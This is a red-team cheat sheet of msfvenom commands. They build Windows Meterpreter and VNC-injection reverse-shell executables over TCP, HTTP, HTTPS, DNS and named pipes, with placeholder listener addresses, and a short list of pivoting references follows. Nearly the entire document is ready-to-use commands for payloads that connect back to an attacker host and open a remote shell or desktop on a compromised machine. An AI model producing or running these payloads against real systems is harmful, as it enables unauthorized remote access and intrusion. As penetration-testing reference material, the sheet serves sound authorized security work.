# Reverse Shells

## Interactive Shells

1. x86 (32-bit) Payloads

```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86.exe

$ msfvenom -p windows/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x86.exe

$ msfvenom -p windows/meterpreter/reverse_https handlersslcert=/path/to/file.pem sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met-x86.exe

$ msfvenom -p windows/meterpreter/reverse_tcp_dns lhost=<dns_URL> lport=<PORT> -f exe met-x86.exe
```

Specify the compromised windows host with `pipehost`.

```
$ msfvenom -p windows/meterpreter/reverse_named_pipe pipehost=<compromised_computer_IP> pipename=<PIPENAME> -f exe -o met-x86.exe
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x64.exe

$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f exe -o met-x64.exe

$ msfvenom -p windows/x64/meterpreter/reverse_https handlersslcert=/path/to/file.pem sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o met_x86_64.exe
```

Specify the compromised windows host with `pipehost`.

```
$ msfvenom -p windows/x64/meterpreter/reverse_named_pipe pipehost=<compromised_computer_IP> pipename=<PIPENAME> -f exe -o met-x64.exe
```

## VNC

1. x86 (32-bit) Payloads

```
$ msfvenom -p windows/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe

$ msfvenom -p windows/vncinject/reverse_http lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe

$ msfvenom -p windows/x64/vncinject/reverse_http lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe

$ msfvenom -p windows/x64/vncinject/reverse_https handlersslcert=/path/to/file.pem sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe
```

---
## References

### Metasploit

- [Metasploit Documentation: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)

### Bordergate

- [BorderGate: Lateral Movement With Named Pipes](https://www.bordergate.co.uk/lateral-movement-with-named-pipes/)

### Nagarro Security

- [Nagarro Security: SMB NamedPipe Pivoting Meterpreter](https://nagarrosecurity.com/blog/smb-named-pipe-pivoting-meterpreter)

### Peter Gombos

- [Peter Gombos: SMB Named Pipe Pivoting in Meterpreter](https://medium.com/@petergombos/smb-named-pipe-pivoting-in-meterpreter-462580fd41c5)